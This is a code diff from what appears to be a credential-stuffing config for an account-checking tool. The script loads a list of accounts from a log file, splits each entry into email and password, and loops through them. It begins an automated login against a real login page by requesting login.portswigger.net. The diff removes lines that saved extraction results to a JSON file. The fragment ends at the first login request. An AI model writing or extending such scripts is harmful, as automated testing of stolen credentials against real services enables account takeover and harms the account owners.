@@ -4,11 +4,7 @@
 FileReadLines "Configs\log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-CreatePath "Configs\\extraction_results"
-FileWrite "Configs\\extraction_results\\results.json" "[\n" -> VAR "firstLine"
-
 SET VAR "counter" "0" Integer
-SET VAR "total" $"<accounts[*]>" Integer
 
 ## Loop through each account
 FOREACH $"<accounts>" -> VAR "account"
@@ -20,7 +16,7 @@ FOREACH $"<accounts>" -> VAR "account"
   SET VAR "email" $"<creds[0]>"
   SET VAR "password" $"<creds[1]>"
 
-  PRINT "[$"<counter>"/$"<total>"] $"<email>"..." White
+  PRINT "[$"<counter>"] $"<email>"..." White
 
   ## Step 1: GET login page
   HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
